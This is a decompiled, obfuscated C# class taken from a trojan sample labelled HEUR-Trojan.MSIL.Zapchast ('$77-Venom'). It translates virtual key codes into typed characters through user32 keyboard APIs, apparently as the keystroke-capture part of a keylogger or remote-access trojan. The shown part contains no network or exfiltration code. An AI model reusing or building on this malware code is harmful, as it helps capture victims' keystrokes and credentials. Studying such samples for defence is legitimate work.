// Decompiled with JetBrains decompiler
// Type: ্챽韱馕ꯠ렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal static class \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂
{
  public const byte \u2885\uE538鹮䳞\uE65B\uF069\u0B58\uFFFDꊯ\uFFFD猦\uFFFD潤湒檮쟞䬞眐鼎\u25A1 = 16;
  public const byte 洄\u21C5䟛檼斤\uEDA5ꇭ肥在黚岷ꉙ\u2991刨\u2954ꇝॅ琵椻퉧 = 20;
  public const byte 鶄筷ᨏ匳뀵뫖䝠ೠ뮠\u0383\uF0C0䆹\u28FCꡤꃅ吺㟨묿ﷅ\u2ACA = 144;
  public const byte 녘\uFFFD옐ꕦ뺠瓁쌺좖\u3259쓟䙀鐧\uEA9B糰뇼壂䛱嶰飁\uFFFD = 160;
  public const byte 懡\u2936ᛖ\uFFFD蕍\uFE40殡ᯩ쐄蒳\uF477㲤芯둸췡ᦊ\u22C4\uE83A꽸쏛 = 161;
  public const byte 霕\uEB90穥烩꺎\uEB44\uF519뿠鱥粦ⷕ溜ᄘ錁ɼ쳃ፒ泰ģ鴖 = 162;
  public const byte み\uF6DB鷊ᬥ\u24A1聘臩Ῠ\u20CD\u1C9A\uE2E3퉠㧒ѳ䒻ॺ뎴谔ꏼ뼜 = 163;
  public const byte 趪ꜞ\uFFFDݪ\u27ACð씠ᑨ㺍棴퀹婙驭흽萕繃庳횶졉䎊 = 164;
  public const byte 韐\u9FF3拫컣\uFFFDꭡഎ猘ᨮ\uA82E뻹꽖굗娦䍊ᜑ巈鑟\u27A8\u2817 = 165;
  public const byte İ䦿諞툇柣㠲終헿獺ᢐ禖섭簾ࢱ퓞ᒉỵ婣蟮\uF062 = 91;
  public const byte 狳\u09D8쒘䕈㲟Ȓ鍂䖛㰰\u2F67觵ᛲ敊\uFFFD杜괢\uF4C3ೃ养\u2293 = 92;
  public const byte 庘鼦\uE115㙍\uFFFD箸嶲輯\uE1AA揞퐠㥀뫂\uEA9Cꖂ흨\u29CEႣ㨀봌 = 145;
  public const byte 蠸\uE9B1\uE9EC\u234E줣\uFFFD틓軛旚颺\u31EC뉎\uFFFDꜢ烣\uE923霃\uFFFDૠ馐 = 45;
  public const byte 饹迱猴\uE4BE洶\uFFFD靚\uFFFD\uFFFD\uEC4D朌ꓑ䯴谷\uEFFF\uEA9A쥓ŏ\u0FCB뛓 = 17;
  public const byte 憙嗚\u229E橫\u3237㹎犼Ⴝ塾씵ᓊퟡ\u173Eǌ苻\uF083۵\uFFFD銼埱 = 18;
  public const byte \uE8EFఙ狼䀛\uE09A䮴\uE05E\u08DA䀍륗ⷵ랍轘挆춶퓈\u0E8B求㿪\uFFFD = 231;
  private static int \uED79腐ᛆ\uFFFDన\u2EE5뿑ផꦏ\uF824\uFFFD㘢锤蜗\u2479霣酧ᨔᒊ슧 = 0;
  private static int \uFFFD量얛呔\u282D픕燘\uF314栂\u23A7롎ᖼΎ逍ℳﳩ뀝퐬戆\u17F6 = 0;
  private static byte[] \uFFFD邴帧\uEC3D芒邦ꔭ箱恐\u2AB6\uEE4E馋椽썠\u9FD6诰\uA83C窐ﾅ퉼 = new byte[256];
  private static bool Τ\u2716Ԙ래㶋턴欽廒跐\u28A3鸀᥋廔\uF00A쀑ှ篃㱨\uF8BB\u2496 = false;

  internal static void ﺧ奦뇩唭랂ꅞ僠刵䇽\uEFF7針薗䤰\u3331\uEE91뼿䦬嶤磃꼹(
    int virtualKeyCode,
    int fuState,
    out char[] chars)
  {
    IntPtr dwhkl = \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.㶞\uEC8F坢\u2A10ꤵ\uFFFD쐜飷겾軤摸隓쌚ꌱ\u33E5怯\uEA93Ꭓ\uF86A獝();
    int scanCode = \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\u2B78뎔緳玫孥\uE257鬝푀\uF7FF\u0E3C䪿뀠撠秸᥎뢒㼼\uF21D쒹箇(virtualKeyCode, 0, dwhkl);
    \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.吱颒鷪ඵᡚ갡碮퉧甒\uF3EE큯Ί秭孷䫌\u05C0浻ᅾ澝졌(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
  }

  internal static void \u2353\uFFFD铖\u2F8E흤\u20FC딨㦗蠧䍪맷㣂\uFFFD\uE8A8\u26B9\u2FF0炾\uED7A釢ꛚ(
    int virtualKeyCode,
    int scanCode,
    int fuState,
    out char[] chars)
  {
    IntPtr dwhkl = \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.㶞\uEC8F坢\u2A10ꤵ\uFFFD쐜飷겾軤摸隓쌚ꌱ\u33E5怯\uEA93Ꭓ\uF86A獝();
    \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.吱颒鷪ඵᡚ갡碮퉧甒\uF3EE큯Ί秭孷䫌\u05C0浻ᅾ澝졌(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
  }

  internal static void 吱颒鷪ඵᡚ갡碮퉧甒\uF3EE큯Ί秭孷䫌\u05C0浻ᅾ澝졌(
    int virtualKeyCode,
    int scanCode,
    int fuState,
    IntPtr dwhkl,
    out char[] chars)
  {
    StringBuilder pwszBuff1 = new StringBuilder(64);
    쿚涆좮䌭\u23E1禹싘ﵱ햴\uA60D讧ﯾ坙慴\u28EF苣ड़ශ嗇䳌 쿚涆좮䌭禹싘ﵱ햴讧ﯾ坙慴苣ड़ශ嗇䳌 = 쿚涆좮䌭\u23E1禹싘ﵱ햴\uA60D讧ﯾ坙慴\u28EF苣ड़ශ嗇䳌.쾉䀴亐㨯㛬ʵ鋁\uE3E8\uFBCBᇏ혔Ⳑ욮ử敃鴲늫ѭ둜묀();
    byte[] lpKeyState = 쿚涆좮䌭禹싘ﵱ햴讧ﯾ坙慴苣ड़ශ嗇䳌.횸\uFFFDЊ絼懜뿁淋鮯黨骹\u03A2\u25DD螵퇱ꪘ䓌ꤤ\uEE4D䡕눐();
    bool flag = false;
    if (쿚涆좮䌭禹싘ﵱ햴讧ﯾ坙慴苣ड़ශ嗇䳌.甗ꑭᖜ岍\uECBB孹뉼祵囸巅\uE2C5ﯓ圹槍ㄙ泔\uE2F1Ⲟ鹊烈(Keys.ShiftKey))
      lpKeyState[16] = (byte) 128;
    if (쿚涆좮䌭禹싘ﵱ햴讧ﯾ坙慴苣ड़ශ嗇䳌.鶕鉠屏窉㬸䴳祺獽潼赂嶞ꋖ뢐쯨敀榬\uE9B1쇋䩑\uFFFD(Keys.Capital))
      lpKeyState[20] = (byte) 1;
    switch (\u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.ॾ\u2A0A눠킫ꯟ㛳낐䓙笪\uFE56\uE41C布톏곩䭎踃珊磊捷\u331C(virtualKeyCode, scanCode, lpKeyState, pwszBuff1, pwszBuff1.Capacity, fuState, dwhkl))
    {
      case -1:
        flag = true;
        \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\u1097ٵ\u08DC펬䨹ᦡҒ\u2715䙈顗\u2855槔麎ᤙ镉厚솭\uFFFD\uFFFDㄼ(virtualKeyCode, scanCode, dwhkl);
        chars = (char[]) null;
        break;
      case 0:
        chars = (char[]) null;
        break;
      case 1:
        if (pwszBuff1.Length > 0)
        {
          chars = new char[1]{ pwszBuff1[0] };
          break;
        }
        chars = (char[]) null;
        break;
      default:
        if (pwszBuff1.Length > 1)
        {
          chars = new char[2]{ pwszBuff1[0], pwszBuff1[1] };
          break;
        }
        chars = new char[1]{ pwszBuff1[0] };
        break;
    }
    if (\u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uED79腐ᛆ\uFFFDన\u2EE5뿑ផꦏ\uF824\uFFFD㘢锤蜗\u2479霣酧ᨔᒊ슧 != 0 && \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.Τ\u2716Ԙ래㶋턴欽廒跐\u28A3鸀᥋廔\uF00A쀑ှ篃㱨\uF8BB\u2496)
    {
      if (chars == null)
        return;
      StringBuilder pwszBuff2 = new StringBuilder(5);
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.ॾ\u2A0A눠킫ꯟ㛳낐䓙笪\uFE56\uE41C布톏곩䭎踃珊磊捷\u331C(\u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uED79腐ᛆ\uFFFDన\u2EE5뿑ផꦏ\uF824\uFFFD㘢锤蜗\u2479霣酧ᨔᒊ슧, \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uFFFD量얛呔\u282D픕燘\uF314栂\u23A7롎ᖼΎ逍ℳﳩ뀝퐬戆\u17F6, \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uFFFD邴帧\uEC3D芒邦ꔭ箱恐\u2AB6\uEE4E馋椽썠\u9FD6诰\uA83C窐ﾅ퉼, pwszBuff2, pwszBuff2.Capacity, 0, dwhkl);
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.Τ\u2716Ԙ래㶋턴欽廒跐\u28A3鸀᥋廔\uF00A쀑ှ篃㱨\uF8BB\u2496 = false;
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uED79腐ᛆ\uFFFDన\u2EE5뿑ផꦏ\uF824\uFFFD㘢锤蜗\u2479霣酧ᨔᒊ슧 = 0;
    }
    else
    {
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uFFFD量얛呔\u282D픕燘\uF314栂\u23A7롎ᖼΎ逍ℳﳩ뀝퐬戆\u17F6 = scanCode;
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uED79腐ᛆ\uFFFDన\u2EE5뿑ផꦏ\uF824\uFFFD㘢锤蜗\u2479霣酧ᨔᒊ슧 = virtualKeyCode;
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.Τ\u2716Ԙ래㶋턴欽廒跐\u28A3鸀᥋廔\uF00A쀑ှ篃㱨\uF8BB\u2496 = flag;
      \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.\uFFFD邴帧\uEC3D芒邦ꔭ箱恐\u2AB6\uEE4E馋椽썠\u9FD6诰\uA83C窐ﾅ퉼 = (byte[]) lpKeyState.Clone();
    }
  }

  private static void \u1097ٵ\u08DC펬䨹ᦡҒ\u2715䙈顗\u2855槔麎ᤙ镉厚솭\uFFFD\uFFFDㄼ(
    int vk,
    int sc,
    IntPtr hkl)
  {
    StringBuilder pwszBuff = new StringBuilder(10);
    byte[] lpKeyState;
    do
    {
      lpKeyState = new byte[(int) byte.MaxValue];
    }
    while (\u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.ॾ\u2A0A눠킫ꯟ㛳낐䓙笪\uFE56\uE41C布톏곩䭎踃珊磊捷\u331C(vk, sc, lpKeyState, pwszBuff, pwszBuff.Capacity, 0, hkl) < 0);
  }

  private static IntPtr 㶞\uEC8F坢\u2A10ꤵ\uFFFD쐜飷겾軤摸隓쌚ꌱ\u33E5怯\uEA93Ꭓ\uF86A獝() => \u09CD챽韱馕ꯠ\uF828렰惢뭷澪厈麸呟㥶亢䦵輅킟豞牂.倏\uEF96힁쳺뎇\u0DC8䛉탡ࡓ떵嫘舎\uF8B3몱\uE071쒴큀\u325F\u2631펕(쑞縷\u32E1䠪䶙꺨赺\u2724瘝\u24AD빞謽縹ꂦ\uF7D0Ę\u2FB9㧑䧙ᾁ.闊멓ڐ凇ꙶ\u261A촟ᓧᎫ\uE21F\uE610厜㘫ᇡ䙱᠒溙\u220D駓\uF80B(쑞縷\u32E1䠪䶙꺨赺\u2724瘝\u24AD빞謽縹ꂦ\uF7D0Ę\u2FB9㧑䧙ᾁ.\uF70E\u1AAD欜봊본ཤ䯴ଷ喕텄\u0B00ꗆ돇彋䯬ᢘҸ猛㠋鎦(), out int _));

  [Obsolete("Use ToUnicodeEx instead")]
  [DllImport("user32.dll")]
  public static extern int ToAscii(
    int uVirtKey,
    int uScanCode,
    byte[] lpbKeyState,
    byte[] lpwTransKey,
    int fuState);

  [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
  public static extern int ॾ\u2A0A눠킫ꯟ㛳낐䓙笪\uFE56\uE41C布톏곩䭎踃珊磊捷\u331C(
    int wVirtKey,
    int wScanCode,
    byte[] lpKeyState,
    [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
    int cchBuff,
    int wFlags,
    IntPtr dwhkl);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
  public static extern int \u0A40囆犘랢ⱺ氿ꐍꎇ㷊끵㕂\uEF4B蕕ꫡ\uE288凃挜\uFFFD됉僯(byte[] pbKeyState);

  [DllImport("user32.dll", EntryPoint = "GetKeyState", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  public static extern short 顎즲锺亣羘쪨徤醬틧썱\u2673쐢把지뽖繷뵧\uF13F兑靆(int vKey);

  [DllImport("user32.dll", EntryPoint = "MapVirtualKeyEx", CharSet = CharSet.Auto)]
  internal static extern int \u2B78뎔緳玫孥\uE257鬝푀\uF7FF\u0E3C䪿뀠撠秸᥎뢒㼼\uF21D쒹箇(
    int uCode,
    int uMapType,
    IntPtr dwhkl);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Auto)]
  internal static extern IntPtr 倏\uEF96힁쳺뎇\u0DC8䛉탡ࡓ떵嫘舎\uF8B3몱\uE071쒴큀\u325F\u2631펕(
    int dwLayout);

  internal enum 㡛\u0EFE坴\u2056錰㐅譼\u2676흉祈䡺箪疢ﻔ밉풾鼔䉶対ⵎ
  {
    韔듁闤縬疵㣍峂尹퓔듎\uF01A䐕랒뼴夹闶媶螸瓮䀄,
    甋慹\u2227瞻Ր襩뢘㬍阙쬏ꞟ슜\u0F38\u2347\uF6C1샶㳥\u2753ᝣꦀ,
    \uF342䡁ጅ笻뉜\uE290쳮榠쑠ݝ\uF70D퓋澀ᗥ傞ꄡ欭뷠览\uEEA9,
    國ᐤꏩ\uE0A4؅ഊ防坢喙嬊\u2EE6띑殰ꌨ鬮\uFFFD鹮\uE615뵄ྵ,
  }
}
